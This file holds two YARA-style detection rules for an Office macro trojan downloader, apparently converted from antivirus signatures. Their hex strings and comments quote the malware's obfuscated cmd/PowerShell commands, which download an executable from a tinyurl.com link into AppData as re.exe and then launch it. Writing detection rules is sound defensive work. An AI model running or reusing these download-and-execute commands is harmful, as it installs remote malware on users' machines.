
rule TrojanDownloader_O97M_Obfuse_JQ_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.JQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,0e 00 0e 00 06 00 00 "
		
	strings :
		$a_03_0 = {3d 20 22 5c 54 65 6d 70 5c 90 02 15 2e 6a 73 22 90 00 } //10
		$a_01_1 = {3d 20 45 6e 76 69 72 6f 6e 28 64 29 } //1 = Environ(d)
		$a_03_2 = {4f 70 65 6e 20 90 02 15 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 90 00 } //1
		$a_01_3 = {2e 43 61 70 74 69 6f 6e } //1 .Caption
		$a_01_4 = {22 53 68 65 6c 6c } //1 "Shell
		$a_01_5 = {26 20 22 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2c } //1 & ".Application"),
	condition:
		((#a_03_0  & 1)*10+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=14
 
}
rule TrojanDownloader_O97M_Obfuse_JQ_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.JQ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_00_0 = {45 58 45 43 28 22 63 6d 64 20 2f 63 20 70 6f 5e 77 65 72 5e 73 68 65 6c 6c 20 2d 77 20 31 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 33 70 73 61 71 6d 6d 27 2c 28 24 65 6e 76 3a 61 70 70 64 61 74 61 20 2b 20 27 5c 72 65 2e 65 78 65 27 29 29 22 29 56 } //1 EXEC("cmd /c po^wer^shell -w 1 (New-Object Net.WebClient).DownloadFile('https://tinyurl.com/y3psaqmm',($env:appdata + '\re.exe'))")V
		$a_00_1 = {45 58 45 43 28 22 63 6d 64 20 2f 63 20 70 6f 5e 77 65 72 5e 73 68 65 6c 6c 20 2d 77 20 31 20 53 74 61 72 74 2d 53 6c 65 65 70 20 31 32 3b 20 73 54 41 72 74 2d 60 50 60 52 60 6f 63 65 73 73 20 24 65 6e 76 3a 61 70 70 64 61 74 61 5c 72 65 2e 65 78 65 22 29 0a } //1
		$a_00_2 = {68 74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 33 70 73 61 71 6d 6d 27 2c 28 24 65 6e 76 3a 61 70 70 64 61 74 61 20 2b 20 27 5c 72 65 2e 65 78 65 27 29 29 22 29 } //1 https://tinyurl.com/y3psaqmm',($env:appdata + '\re.exe'))")
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*1) >=3
 
}